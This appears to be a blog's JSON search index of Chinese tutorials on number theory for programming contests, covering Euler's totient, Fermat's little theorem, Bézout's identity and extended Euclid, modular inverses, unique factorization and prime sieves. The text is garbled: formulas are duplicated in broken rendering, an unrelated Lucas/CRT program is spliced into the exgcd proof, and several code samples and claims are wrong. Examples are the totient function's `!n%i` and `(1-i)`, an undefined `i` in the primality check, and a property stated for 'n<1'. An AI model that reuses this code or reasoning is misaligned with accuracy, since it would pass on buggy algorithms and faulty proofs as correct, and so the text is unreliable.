$中两两不同余n Ⅱ.证明$m_1,m_2……m_{φ(n)} 中的所有数取模n得到的结果中的所有数取模n得到的结果中的所有数取模n得到的结果r_1,r_2……r_ {φ(n)}$与n互质 证明Ⅰ 正面证明不方便，于是考虑反正法： 假设从中任取两个数mx,nym_x,n_ymx​,ny​，有mx≡my（mod n）m_x≡ m_y（\\mod n）mx​≡my​（modn） 则设mx&gt;mym_x &gt; m_ymx​&gt;my​,那么mx−my≡0(mod n)m_x-m_y≡0(\\mod n)mx​−my​≡0(modn), 也就是a×(xx−xy)≡0(mod n)a\\times (x_x-x_y)≡0(\\mod n)a×(xx​−xy​)≡0(modn), 由于xx&lt;n且xy&lt;nx_x &lt; n 且 x_y &lt; nxx​&lt;n且xy​&lt;n，所以xx−xy&lt;nx_x-x_y &lt; nxx​−xy​&lt;n， 显然xx−xyx_x-x_yxx​−xy​与n互质。所以a≡0(mod n)a≡0(\\mod n)a≡0(modn)显然矛盾。 证毕 证明Ⅱ 同样使用反正法 设其中某个数mtm_tmt​的余数rtr_trt​与n有公因子q, 设a×xt=p×n+Ra\\times x_t=p\\times n+Ra×xt​=p×n+R R=q×iR=q\\times iR=q×i n=q×jn=q\\times jn=q×j 则a×xt=p×n+q×ia\\times x_t=p\\times n+q\\times ia×xt​=p×n+q×i 则a×xt=q×(p×j+i)a\\times x_t=q\\times (p\\times j+i)a×xt​=q×(p×j+i) 因为q是n的一个因子，所以从此式可以得到a×xt≡0(mod n)a\\times x_t≡0 (\\mod n)a×xt​≡0(modn)显然矛盾 所以得证 总结 所以$m_1,m_2……m_{φ(n)} 中对n取模得到的值包含于中对n取模得到的值包含于中对n取模得到的值包含于x_1,x_2……x_{φ(n)} $中。 则m1×m2……×mφ(n)≡x1×x2×……×xφ(n)(mod n)m_1\\times m_2……\\times m_{φ(n)}≡x_1\\times x_2\\times ……\\times x_{φ(n)} (\\mod n)m1​×m2​……×mφ(n)​≡x1​×x2​×……×xφ(n)​(modn) 于是令k=x1×x2×……×xφ(n)k=x_1\\times x_2\\times ……\\times x_{φ(n)}k=x1​×x2​×……×xφ(n)​. 则原式为aφ(n)×k≡k(mod n)a_{φ(n)}\\times k≡k(\\mod n)aφ(n)​×k≡k(modn) 得到k×(aφ(n)−1)≡0(mod n)k\\times (a_{φ(n)}-1)≡0(\\mod n)k×(aφ(n)​−1)≡0(modn) 由于k显然与n互质,所以$ (a_{φ(n)}-1)≡0(\\mod n)$ 证明完毕 性质 1.对于质数p，φ(p)=p−1φ(p)=p−1φ(p)=p−1。 2.若p为质数，n=pkn=p^kn=pk ，则φ(n)=pk−pk−1φ(n)=p^k-p^{k-1}φ(n)=pk−pk−1 。 3.欧拉函数是积性函数，但不是完全积性函数。若m,n互质，则φ(m∗n)=φ(m)∗φ(n)φ(m∗n)=φ(m)∗φ(n)φ(m∗n)=φ(m)∗φ(n) 。特殊的，当m=2m=2m=2，n为奇数时，φ(2∗n)=φ(n)φ(2*n)=φ(n)φ(2∗n)=φ(n)。 4.当n&gt;2n &gt; 2n&gt;2时，φ(n)φ(n)φ(n)是偶数。 5.小于n的数中，与n互质的数的总和为：φ(n)∗n/2(n&lt;1)。φ(n) * n / 2 (n &lt; 1)。φ(n)∗n/2(n&lt;1)。 6.$n=∑_{d∣n}φ(d) $，即n的因数（包括1和它自己）的欧拉函数之和等于n。 证明略，详见欧拉函数性质原地址 代码 求单个数n的欧拉函数值 123456789101112131415161718//实践复杂度为O(sqrt(n))LL oula(LL n)&#123; LL ans=n; for(LL i=2;i*i&lt;n;i++) &#123; if(!n%i)//找n的因子 &#123; ans=ans/i*(1-i); while(!n%i)//利用唯一分解定理 &#123; n/=i; &#125; &#125; &#125; if(n&gt;1)ans=ans/n*(n-1); return ans;&#125; 求n个数的欧拉函数值打表 1234567891011121314151617181920212223242526//时间复杂度为O(n)#include&lt;cstdio&gt;using namespace std;const int N = 1e6+10 ;int phi[N], prime[N];int tot;//tot计数，表示prime[N]中有多少质数 void Euler()&#123; phi[1] = 1; for(int i = 2; i &lt; N; i ++)&#123; if(!phi[i])&#123; phi[i] = i-1; prime[tot ++] = i; &#125; for(int j = 0; j &lt; tot &amp;&amp; 1ll*i*prime[j] &lt; N; j ++)&#123; if(i % prime[j]) phi[i * prime[j]] = phi[i] * (prime[j]-1); else&#123; phi[i * prime[j] ] = phi[i] * prime[j]; break; &#125; &#125; &#125;&#125; int main()&#123; Euler();&#125; 费马小定理 内容 对于一个素数p，另一个不是p的倍数的整数a，有a(p−1)≡1(mod p)a^{(p-1)}≡1(\\mod p)a(p−1)≡1(modp) 证明 显然由于p为素数，那么所有小于p的数，都与p互质，则φ(p)=p−1φ(p)=p-1φ(p)=p−1，那么由欧拉定理得证费马小定理。 费马小定理引理 在ACM中费马小定理本身使用的不如他的引力平凡，下面介绍一条费马小定理的引理： 内容 若正整数a,na,na,n互质，那么对于任意正整数bbb，有ab≡abmodφ(n)(mod n)a^b≡a^{b mod φ(n)}(\\mod n)ab≡abmodφ(n)(modn) 证明 我们先将原式进行变形： ab−bmod φ(n)×abmodφ(n)≡abmodφ(n)(mod n)a^{b-b\\mod φ(n)}\\times a^{b mod φ(n)}≡a^{b mod φ(n)}(\\mod n)ab−bmodφ(n)×abmodφ(n)≡abmodφ(n)(modn) 于是得到 ab−bmod φ(n)≡1(mod n)a^{b-b\\mod φ(n)}≡1(\\mod n)ab−bmodφ(n)≡1(modn) 于是我们只需要证明上式成立即可。 由于(b−bmod φ(n))∣φ(n)(b-b\\mod φ(n))|φ(n)(b−bmodφ(n))∣φ(n)（因为b可以表示为b=q×φ(n)+bmod φ(n)b=q\\times φ(n)+b\\mod φ(n)b=q×φ(n)+bmodφ(n)）,于是我们设(b−bmod φ(n))=q×φ(n)(b-b\\mod φ(n))=q\\times φ(n)(b−bmodφ(n))=q×φ(n),则有aq×φ(n)≡1(mod n)a^{q\\times φ(n)}≡1(\\mod n)aq×φ(n)≡1(modn),即aqφ(n)≡1(mod n)a^{q^{φ(n)}}≡1(\\mod n)aqφ(n)≡1(modn) 由于a与n互质，那么aqa^{q}aq与n互质，所以由费马小定理得，上式成立。 证明完毕。 应用 于是我们就可以使用这个引理将求幂运算取模时的幂减小。 参考链接 Ⅰ.欧拉函数的性质 Ⅱ.费马小定理推论(附例题)","categories":[{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"算法","slug":"ACM/算法","permalink":"http://enderxiao.github.io/categories/ACM/%E7%AE%97%E6%B3%95/"},{"name":"数论入门","slug":"ACM/数论入门","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"}]},{"title":"数论入门:斐蜀定理与拓展欧几里得算法","slug":"数论入门-斐蜀定理与拓展欧几里得算法","date":"2021-01-18T10:52:11.000Z","updated":"2024-07-30T11:26:33.933Z","comments":true,"path":"2021/01/18/数论入门-斐蜀定理与拓展欧几里得算法/","permalink":"http://enderxiao.github.io/2021/01/18/%E6%95%B0%E8%AE%BA%E5%85%A5%E9%97%A8-%E6%96%90%E8%9C%80%E5%AE%9A%E7%90%86%E4%B8%8E%E6%8B%93%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/","excerpt":"","text":"​ 斐蜀定理 内容 斐蜀定理又叫贝祖定理，它的内容是这样的： 若a,b∈Na,b\\in Na,b∈N,那么对于任意x，y，方程ax+by=gcd(a,b)∗k(k∈N)ax+by=gcd(a,b)*k(k\\in N)ax+by=gcd(a,b)∗k(k∈N)一定有解，且一定有一组解使ax+by=gcd(a,b)ax+by=gcd(a,b)ax+by=gcd(a,b) 推论 a，b互素的充要条件是方程ax+by=1ax+by=1ax+by=1有整数解。 证明 令d=gcd(a,b)d=gcd(a,b)d=gcd(a,b)，则d∣a,d∣bd|a,d|bd∣a,d∣b 那么就能得到d∣(ax+by)d|(ax+by)d∣(ax+by) 于是我们设s为ax+byax+byax+by能得到的最小正整数值，则d∣sd|sd∣s。 令q=a÷sq=a\\div sq=a÷s(此处为整除),r=amod sr=a\\mod sr=amods，则a=qs+ra=qs+ra=qs+r。 -&gt;r=a−qsr=a-qsr=a−qs -&gt;r=a−q(ax+by)r=a-q(ax+by)r=a−q(ax+by) -&gt;r=(1−qx)a+b(−qy)r=(1-qx)a+b(-qy)r=(1−qx)a+b(−qy) 则通过观察可以发现r也是一个关于a,b的线性组合，其中x=(1−qx),y=(−qy)x=(1-qx),y=(-qy)x=(1−qx),y=(−qy) 因为0≤r&lt;s0\\leq r &lt; s0≤r&lt;s,又因为s是a,b线性组合所能得到的最小自然数，那么r既然比s小，r只能等于0. 所以既然余数为0就说明s∣as|as∣a,同理可证明s∣bs|bs∣b，所以能得到s∣(ax+by)s|(ax+by)s∣(ax+by)。 于是就有s∣ds|ds∣d,又因为上文提到了d∣sd|sd∣s，所以得到s==ds==ds==d 由于s是ax+byax+byax+by所得到任意值的集合中的最小者，又因为s=d，d=gcd(a,b)所以得到 ax+by=gcd(a,b)ax+by=gcd(a,b)ax+by=gcd(a,b) 证明完毕 拓展欧几里得算法 内容 所谓拓展欧几里得算法，那一定是跟欧几里得算法有一定关系的，拓展欧几里得算法所研究的问题是，讨论如何求满足斐蜀定理的一组方程的解。 方法 下面直接给出代码 123456789101112131415161718///inv,x,y应在外部定义,d为gcd(a,b)///解整数方程:ax+by=gcd(a,b);void exgcd(ll a,ll b,ll&amp; inv,ll&amp; x,ll&amp; y)&#123; if(b) &#123; exgcd(b,a%b,inv,x,y); ll temp=x; x=y; y=temp-a/b*y; &#125; else &#123; inv=a; x=1; y=0; &#125;&#125; 证明 假设a&gt;b: Ⅰ.当b=0时，gcd(a,b)=a，于是方程就变成了ax=gcd(a,b)=aax=gcd(a,b)=aax=gcd(a,b)=a，易知x=1,那么当x=1,y=0，时就得到了方程的一组解。 Ⅱ.设两方程: ax1+by1=gcd(a,b)ax_1+by_1=gcd(a,b)ax1​+by1​=gcd(a,b) bx2+(amod b)yx=gcd(b,amod b)bx_2+(a\\mod b)y_x=gcd(b,a\\mod b)bx2​+(amodb)yx​=gcd(b,amodb) 有欧几里得算法得gcd(a,b)=gcd(b,amod b)gcd(a,b)=gcd(b,a\\mod b)gcd(a,b)=gcd(b,amodb) 于是得到: ax1+by1=bx2+(amod b)y2ax_1+by_1=bx_2+(a\\mod b)y_2ax1​+by1​=bx2​+(amodb)y2​. 其中amod b=a−a÷b×ba\\mod b=a-a\\div b\\times bamodb=a−a÷b×b(此处为整除)，带入原式得到: ax1+by1=bx2+ay2−a÷b×y2×bax_1+by_1=bx_2+ay_2-a\\div b\\times y_2\\times bax1​+by1​=bx2​+ay2​−a÷b×y2​×b 通过移项得到: ax1+by1=ay2+b(x2−a÷b×y2)ax_1+by_1=ay_2+b(x_2-a\\div b\\times y_2)ax1​+by1​=ay2​+b(x2​−a÷b×y2​) 则可以得到: xxxxxxxxxx108 1#include 2#include 3#include 4#include 5#include 6#include 7using namespace std;8typedef long long ll;9#define MAXN 1510ll t;11ll n,m;12ll k;13ll a[MAXN];14ll r[MAXN];15​16//唯一分解定理将mod分解为素数17ll fj(ll n)18{19 int c=0;20 for(int i=2;i&lt;=n;i++)21 {22 while(n%i0)23 {24 a[c++]=i;25 n/=i;26 }27 }28 return c;29}30​31//快速乘取模32ll mul(ll a,ll b,ll mod)33{34 ll res=0;35 while(b)36 {37 if(b&amp;1)res=(res+a)%mod;38 a=(a+a)%mod;39 b&gt;&gt;=1;40 }41 return res;42}43//计算n！%mod44ll fact(ll n,ll mod)45{46 ll res=1;47 for (int i = 1; i &lt;= n; ++i) {48 res=(resi)%mod;49 }50 return res;51}52void exgcd(ll a,ll b,ll &amp;x,ll &amp;y,ll &amp;d)53{54 if(!b)55 {56 d=a;57 x=1;58 y=0;59 } else{60 exgcd(b,a%b,y,x,d);61 y-=x(a/b);62 }63}64//用exgcd计算t模mod的逆元65ll inv(ll t,ll mod)66{67 ll d,x,y;68 exgcd(t,mod,x,y,d);69 return d1?(x%mod+mod)%mod:-1;70}71//计算C(n,m)%mod:C(n,m)%mod=(n!/[m!(n-m)!])%mod=n!%modinv(m!,mod)%mod*inv((n-m)!,mod)%mod72ll comb(ll n,ll m,ll mod)73{74 if(m&lt;0||m&gt;n)return 0;75 return fact(n,mod)inv(fact(m,mod),mod)%modinv(fact(n-m,mod),mod)%mod;76}77//lucas定理:C(n,m)%mod=C(n/mod,m/mod)C(n%mod,m%mod)%mod78ll lucas(ll n,ll m,ll mod)79{80 return m?lucas(n/mod,m/mod,mod)comb(n%mod,m%mod,mod)%mod:1;81}82​83//中国剩余定理求解C(n,m)%mod=C(n,m)%(a1a2a3…)(ai为素数)84ll china(ll n,ll *d,ll *m)85{86 ll M = 1, ret = 0;87 for(int i = 0; i &lt; n; i ++) M *= m[i];88 for(int i = 0; i &lt; n; i ++)89 {90 ll w = M / m[i];91 ret = (ret + mul(w * inv(w, m[i]), d[i], M)) % M;92 }93 return (ret + M) % M;94}95int main()96{97 cin&gt;&gt;t;98 while(t–)99 {100 cin&gt;&gt;n&gt;&gt;m&gt;&gt;k;101 ll num=fj(k);//分解模k102 for (int i = 0; i &lt;num; i) {103 r[i]=lucas(n,m,a[i]);104 }105 cout&lt;&lt;china(num,r,a)&lt;&lt;endl;106 }107 return 0;108}C 于是就得到了x，y的递推关系，求接的过程是递归的，从最后一个解x=1,y=0x=1,y=0x=1,y=0，就能推导到第一个式子的一个解。证毕。 参考链接 Ⅰ.EXGCD证明","categories":[{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"算法","slug":"ACM/算法","permalink":"http://enderxiao.github.io/categories/ACM/%E7%AE%97%E6%B3%95/"},{"name":"数论入门","slug":"ACM/数论入门","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"}]},{"title":"数论入门:逆元","slug":"数论入门-逆元","date":"2021-01-18T10:36:01.000Z","updated":"2024-07-30T11:26:33.933Z","comments":true,"path":"2021/01/18/数论入门-逆元/","permalink":"http://enderxiao.github.io/2021/01/18/%E6%95%B0%E8%AE%BA%E5%85%A5%E9%97%A8-%E9%80%86%E5%85%83/","excerpt":"","text":"逆元的理解 数论中的逆元即数论倒数，既一个正整数a，存在另一个正整数x使得a×x≡1(mod p)a\\times x≡1(\\mod p)a×x≡1(modp)（其中a与p互素），则称x为a的一个关于p的逆元。 逆元的由来 为什么要有逆元这个说法呢，类比到矩阵中去，在矩阵乘法中，两个乘积为单位矩阵的矩阵，其中一个矩阵就是另一个矩阵的逆矩阵，这样就解决了矩阵中没有定义除法的问题。 而类似的，在数论中也没有除法的相关定义（学过线代会知道整数集对于除法是不封闭的），于是我们就思考如何将乘法转换为除法（参考实数集中的分数）。 再来举几个取模中的例子来说明一下： 再取模运算的规律中，有如下几个定义： (a+b)mod p=(amod p+bmod p)mod p(a + b) \\mod p = (a\\mod p + b\\mod p) \\mod p(a+b)modp=(amodp+bmodp)modp (a−b)mod p=(amod p−bmod p)mod p(a - b) \\mod p = (a\\mod p - b\\mod p) \\mod p(a−b)modp=(amodp−bmodp)modp $(a \\times b) \\mod p = (a\\mod p \\times b\\mod p) \\mod p $ 为什么其中没有定义除法相关的取模运算呢？ 来举个例子 对于(100/50)mod 20(100/50)\\mod 20(100/50)mod20来说，结果应该是2； 那么如果使用上述定义的方法来计算这个值，也就是((100mod 20)/(50mod 20))mod 20((100\\mod 20) /(50\\mod 20))\\mod 20((100mod20)/(50mod20))mod20， 那么结果应该是0，显然是矛盾的，也就是说对于除法来说，取模运算时非常复杂的，而在计算机中，通常需要计算两个很大的数字相除的时候，是存不下的，但这个时候又不能使用取模公式使分子和分母变小，于是就有了逆元 逆元的概念 在实数集中我们如何将除法转化为乘法呢，我们定义了分数，也就是 若a×x=1a\\times x=1a×x=1，就令x=1/ax=1/ax=1/a，如果a不为1，x就为小数。 而在数论中要考虑的问题就变成了a×x≡1(mod p)a\\times x≡1(\\mod p)a×x≡1(modp)，而这里的x还是1/x嘛？答案是不是，举个例子： 2×3mod 5=12\\times 3\\mod 5=12×3mod5=1 所以逆元也叫数论倒数。这里我们令x=inv(a,p)x=inv(a,p)x=inv(a,p)，也就是表示a模p运算时的逆元。 那么我们再来思考这个问题(a/b)mod p(a/b)\\mod p(a/b)modp要如何来转化，我们先将除法变为乘法，也就是(a×inv(a,p))mod p(a\\times inv(a,p))\\mod p(a×inv(a,p))modp。 于是我们就能使用乘法公式进行展开，变为(amod p×inv(a,p)mod p)mod p(a\\mod p\\times inv(a,p)\\mod p)\\mod p(amodp×inv(a,p)modp)modp，于是我们缩小a的目的就达到了。 下面介绍如何计算逆元 逆元的计算 首先明确只有当a与p互质时，a才存在关于p的逆元。求逆元的方法主要时利用费马小定理和拓展欧几里得定理 费马小定理 证明 数论四大定理中的费马小定理是这样定义的： ap−1≡1(mod p)a^{p-1}≡1(\\mod p)ap−1≡1(modp),其中p为素数，a与p互素。 那么我们两边同时乘以a关于p的逆元，也就得到了ap−1×inv(a,p)≡inv(a,p)(mod p)a^{p-1} \\times inv(a,p)≡inv(a,p)(\\mod p)ap−1×inv(a,p)≡inv(a,p)(modp) 于是由逆元的性质得到了逆元的计算方法： ap−2≡inv(a,p)(mod p)a^{p-2}≡inv(a,p)(\\mod p)ap−2≡inv(a,p)(modp) 也就是ap−2=inv(a,p)(mod p)a^{p-2}=inv(a,p)(\\mod p)ap−2=inv(a,p)(modp)，再使用一次快速幂就能得到逆元了 代码 123456789101112LL pow_mod(LL a, LL b, LL p)&#123;//a的b次方求余p LL ret = 1; while(b)&#123; if(b &amp; 1) ret = (ret * a) % p; a = (a * a) % p; b &gt;&gt;= 1; &#125; return ret;&#125;LL Fermat(LL a, LL p)&#123;//费马求a关于b的逆元 return pow_mod(a, p-2, p);&#125; 拓展欧几里得算法 当a，b互质的时候，贝祖定理得到的结果应该是长这样的： a×x+b×y=1a\\times x+b\\times y=1a×x+b×y=1 贝祖定理证明了这个式子是有解的。接下来我们让两边同时取模b，得到： a×xmod b+b×ymod b=1mod ba\\times x\\mod b+b\\times y\\mod b=1\\mod ba×xmodb+b×ymodb=1modb 也就是 a×xmod b=1mod ba\\times x\\mod b=1\\mod ba×xmodb=1modb 于是得到同余方程： a×x≡1(mod b)a\\times x≡1(\\mod b)a×x≡1(modb) 于是x就是inv(a,b)。于是就能通过拓展欧几里得算法，求出x。 代码 1234567891011121314151617181920#include&lt;cstdio&gt;typedef long long LL;void ex_gcd(LL a, LL b, LL &amp;x, LL &amp;y, LL &amp;d)&#123; if (!b) &#123;d = a, x = 1, y = 0;&#125; else&#123; ex_gcd(b, a % b, y, x, d); y -= x * (a / b); &#125;&#125;LL inv(LL t, LL p)&#123;//如果不存在，返回-1 LL d, x, y; ex_gcd(t, p, x, y, d); return d == 1 ? (x % p + p) % p : -1;&#125;int main()&#123; LL a, p; while(~scanf(&quot;%lld%lld&quot;, &amp;a, &amp;p))&#123; printf(&quot;%lld\\n&quot;, inv(a, p)); &#125;&#125; 参考链接 境外之主","categories":[{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"算法","slug":"ACM/算法","permalink":"http://enderxiao.github.io/categories/ACM/%E7%AE%97%E6%B3%95/"},{"name":"数论入门","slug":"ACM/数论入门","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"}]},{"title":"数论初步:唯一分解定理","slug":"数论初步-唯一分解定理","date":"2021-01-17T13:03:22.000Z","updated":"2024-07-30T11:26:33.934Z","comments":true,"path":"2021/01/17/数论初步-唯一分解定理/","permalink":"http://enderxiao.github.io/2021/01/17/%E6%95%B0%E8%AE%BA%E5%88%9D%E6%AD%A5-%E5%94%AF%E4%B8%80%E5%88%86%E8%A7%A3%E5%AE%9A%E7%90%86/","excerpt":"","text":"唯一分解定理初探 唯一分解定理，又叫算术基本定理 内容 她的内容是: 任何一个大于1的自然数N，如果N不为素数，那么，N就能被唯一的分解为有限个素数的乘积。 公式 N=p1a1×p2a2×p3a3×…×pnanN=p_1^{a_1}\\times p_2^{a_2}\\times p_3^{a_3}\\times … \\times p_n^{a_n}N=p1a1​​×p2a2​​×p3a3​​×…×pnan​​，其中p1&lt;p2&lt;p3&lt;…&lt;pnp_1 &lt; p_2 &lt; p_3 &lt; … &lt; p_np1​&lt;p2​&lt;p3​&lt;…&lt;pn​,且pip_ipi​为素数，aia_iai​为正整数。 唯一分解定理证明 从唯一分解定理的内容中可以看出，其中值得证明的地方有两处，一处是，是否所有数都能被分解为素数的乘积，即存在性，第二处是，分解是否唯一，即唯一性。下面我们逐条证明。 存在性 此处使用反正法证明，假设n为不能被分解为质数乘积的自然数中的最小的一个。 因为如果n为素数，那么n显然只能被分解为n，所以假设n为大于1的合数。 既然n为合数，那么一定存在两个数a,b，且1&lt;a,b&lt;n1 &lt; a, b &lt; n1&lt;a,b&lt;n，所以得到 n=a×bn=a\\times bn=a×b。 下面对于a和b进行分析，显然当两个数都为素数的时候矛盾已经出现了，所以下面来讨论一下为合数的情况 如果a，b中有一个为合数，假设是a，那么由于n已经是最小的不能被分解为素数乘积的合数了，那么显然a是可以被分解为素数乘积的(因为如果不能被分解，那么N为最小的不能被分解的合数这个条件就出现了矛盾)。那么矛盾就出现了。同理当两个数都为合数的时候会得到相同的矛盾。 证毕 唯一性 有存在性作为基础，那么唯一性也就值得被证明了，这里我采用相同的方法来证明。假设n为最小的不能被唯一分解为一系列素数乘积的合数，那么我们不妨设n能被分解为一下两形式 Ⅰ.n=q1×q2×…×qnn=q_1\\times q_2\\times … \\times q_nn=q1​×q2​×…×qn​ Ⅱ.n=t1×t2×…×tnn=t_1\\times t_2\\times …\\times t_nn=t1​×t2​×…×tn​ 其中qiq_iqi​和tit_iti​均为素数，且都已经按升序排列好了，显然qi≠tiq_i\\neq t_iqi​=ti​,因为如果相等，那么两式联立时会被约掉，那样的话我们能得到一个更小的素数组合。所以q1≠t1q1\\neq t1q1=t1，那么不妨设q1&lt;t1q_1 &lt; t_1q1​&lt;t1​，然后我们用q1q_1q1​去替换Ⅱ中的t1t_1t1​,从而得到一个比n更小的数m。 于是我们设X=n−mX=n-mX=n−m，那么她应该会有以下两种形式： Ⅲ.X=q1×(q2×…×qn−t1×t2×…×tn)X=q_1\\times (q_2\\times … \\times q_n-t_1\\times t_2\\times …\\times t_n)X=q1​×(q2​×…×qn​−t1​×t2​×…×tn​) Ⅳ.X=(t1−q1)×(t1×t2×…×tn)X=(t_1-q_1)\\times (t_1\\times t_2\\times …\\times t_n)X=(t1​−q1​)×(t1​×t2​×…×tn​) 由于X比n要小，由假设得，X是能被唯一分解为一系列素数的乘积的。由Ⅲ得，q1q_1q1​为X的一个质因子，由于X的分解具有唯一性，那么q1q_1q1​要么包含于q1−t1q_1-t_1q1​−t1​中，要么包含于t1×t2×…×tnt_1\\times t_2\\times …\\times t_nt1​×t2​×…×tn​中，下面我们来分别讨论 ①.当q1q_1q1​包含于t1×t2×…×tnt_1\\times t_2\\times …\\times t_nt1​×t2​×…×tn​中时，显然于假设中 显然qi≠tiq_i\\neq t_iqi​=ti​,因为如果相等，那么两式联立时会被约掉，那样的话我们能得到一个更小的素数组合。 相矛盾。 ②当q1q_1q1​包含于q1−t1q_1-t_1q1​−t1​中，那么我们将得到一个这样的等式t1−q1q1\\frac {t_1-q_1}{q1}q1t1​−q1​​为整数,也就是t1q1−1{\\frac {t_1}{q_1}}-1q1​t1​​−1为整数，那么也就意味着t1q1\\frac {t_1}{q_1}q1​t1​​为整数，这与假设中的 其中qiq_iqi​和tit_iti​均为素数 相矛盾。 证毕。 代码 由此我们证明了唯一分解定理的正确性，为我们之前提到的做了个补充，也为我们接下来的学习做了铺垫，当然证明方法不唯一，如果有更好的证明方法欢迎指出，下面给出代码实现。 12345678910111213141516171819202122#include&lt;cstdio&gt;#include&lt;vector&gt;using namespace std;const int N = 1e6 + 5;vector&lt;int &gt; v[N];void init()&#123; int temp; for(int i = 2; i &lt; N; i ++)&#123; if(v[i].size() == 0)&#123; for(int j = i; j &lt; N; j += i)&#123; temp = j; while(temp % i == 0)&#123; v[j].push_back(i); temp /= i; &#125; &#125; &#125; &#125;&#125;int main()&#123; init();&#125; 参考链接 Ⅰ.唯一性 Ⅱ.存在性","categories":[{"name":"ACM","slug":"ACM","permalink":"http://enderxiao.github.io/categories/ACM/"},{"name":"算法","slug":"ACM/算法","permalink":"http://enderxiao.github.io/categories/ACM/%E7%AE%97%E6%B3%95/"},{"name":"数论初步","slug":"ACM/数论初步","permalink":"http://enderxiao.github.io/categories/ACM/%E6%95%B0%E8%AE%BA%E5%88%9D%E6%AD%A5/"}],"tags":[{"name":"数论","slug":"数论","permalink":"http://enderxiao.github.io/tags/%E6%95%B0%E8%AE%BA/"},{"name":"算法竞赛","slug":"算法竞赛","permalink":"http://enderxiao.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"}]},{"title":"数论初步:素数筛法","slug":"数论初步-素数筛法","date":"2021-01-17T12:41:34.000Z","updated":"2024-07-30T11:26:33.934Z","comments":true,"path":"2021/01/17/数论初步-素数筛法/","permalink":"http://enderxiao.github.io/2021/01/17/%E6%95%B0%E8%AE%BA%E5%88%9D%E6%AD%A5-%E7%B4%A0%E6%95%B0%E7%AD%9B%E6%B3%95/","excerpt":"","text":"关于数论 数论是纯粹数学的分支，主要研究整数的性质，而数论又分为初等数论和高等数论，其中我们研究的方向是初等数论 规范 由于数论是研究整数数学，所以今后使用的未知数都有一个隐含条件x∈Nx \\in Nx∈N 素数 聊到整数就免不了谈素数，数论种素数的定义大家小学的时候都学过，所谓素数，就是因子只有1和它本身的数，最小的素数是2。 素数判定 下面有这样一个问题，任意给定一个x,请判断这个数是不是素数。 分析 第一种方法很简单——通过定义来判断，即从2开始循环到x-1，如果里面有它的因子，那么它就不是，如果没有它就是，使用定义法判断素数的代码很好写，可以自己动手实践一下 查看代码 1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;bool judge(int x)&#123; if(i==1)//注意1不是素数 retuirn false; for (int i = 2; i &lt; x; i++) if (!(x%i)) return false; return true;&#125;int main()&#123; int x; cin&gt;&gt;x; if (judge(x)) cout&lt;&lt;&quot;Yes&quot;&lt;&lt;endl; else cout&lt;&lt;&quot;No&quot;&lt;&lt;endl;&#125; 素数判定的优化 考虑两个数a，b相乘等于x的情况。设c=xc=\\sqrt xc=x​,那么若a≤ca \\leq ca≤c,则b≥cb \\geq cb≥c,因此，x的因子一定是[1,x][1,\\sqrt x][1,x​]与[x+1,x][\\sqrt x+1,x][x​+1,x]一一对应的。于是我们就能做如下优化 查看代码 1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;bool judge(int x)&#123; if(i==1)//注意1不是素数 return false; for (int i = 2; i*i &lt;= x; i++)//使用i*i而不是sqrt（）是为了避免精度问题 if (!(x%i)) return false; return true;&#125;int main()&#123; int x; cin&gt;&gt;x; if (judge(x)) cout&lt;&lt;&quot;Yes&quot;&lt;&lt;endl; else cout&lt;&lt;&quot;No&quot;&lt;&lt;endl;&#125; 查找[1,N][1,N][1,N]中的素数 学会了判断一个数是否为素数之后，我们就会思考如果有N个数，那么我们要如何查找这N个数中的所有素数呢，很容易想到的就是使用O(NN)O(N\\sqrt N)O(NN​)的算法，每个都判断一遍，是素数就记录，具体代码如下： 查看代码 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;const int maxn=1e5+10;int vis[maxn];bool judge(int x)&#123; if(x==1) return false; for (int i = 2; i*i &lt;= x; i++) if (!(x%i)) return false; return true;&#125;int main()&#123; int n; cin&gt;&gt;n; memset(vis,false,sizeof(vis)); for (int i = 1; i &lt;= n; i++) if(judge(i)) vis[i]=true; for (int i = 1; i &lt;= n; i++) if(vis[i]) cout&lt;&lt;i&lt;&lt;endl;&#125; 优化 如果是计算N个数中的素数个数使用之前的方法复杂度是O(nn)O(n\\sqrt n)O(nn​)，如果n取1e6，很显然会TLE，那么我们考虑更快的方法。如果一数是素数，那么它的倍数肯定是合数，于是当我们找到一个素数时，把他在N范围内的所有倍数到标记为和数就行了，那么读到这里大家肯定要问了，为什么只要把素数的倍数标为合数，就能把所有合数都标记上了呢，这里涉及到一个唯一分解定理（任何合数，都能被唯一的分解为有限个素数的乘积），在以后的学习中我们将会谈到它，而这个筛出素数的算法就叫埃拉托斯特尼筛法，或者叫埃氏筛法，简称埃筛，下面看代码 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;const int maxn=1e5+10;bool isprime[maxn];void find(int n)&#123; isprime[1]=false; for (int i = 2; i &lt;= n; i++) isprime[i]=true; for (int i = 2; i &lt;= n; i++) if (isprime[i]) for (size_t j = 2*i; j &lt;= n; 